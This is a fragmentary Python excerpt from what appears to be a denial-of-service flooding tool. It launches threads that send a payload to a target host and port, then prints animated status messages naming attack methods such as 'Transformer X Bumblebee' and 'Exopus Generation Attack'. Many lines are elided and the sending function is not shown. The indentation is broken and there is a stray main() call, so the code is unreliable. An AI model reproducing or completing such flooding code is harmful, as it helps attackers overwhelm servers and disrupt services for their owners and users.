		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[86m[-] has sent packets to the server using a Transformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[86m[\] has sent packets to the server using a Transformer X Bumblebee..")
					time.sleep(1)
					...
					time.sleep(1)
					os.system('cls')
					print("\033[85m[/] has sent packets to the server using a Transformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[+] has sent packets to the server using a Transformer X Bumblebee...")
					time.sleep(1)
			...
			try:
				if running >= 20000:
					...
					main()
						...
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[86m[-] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
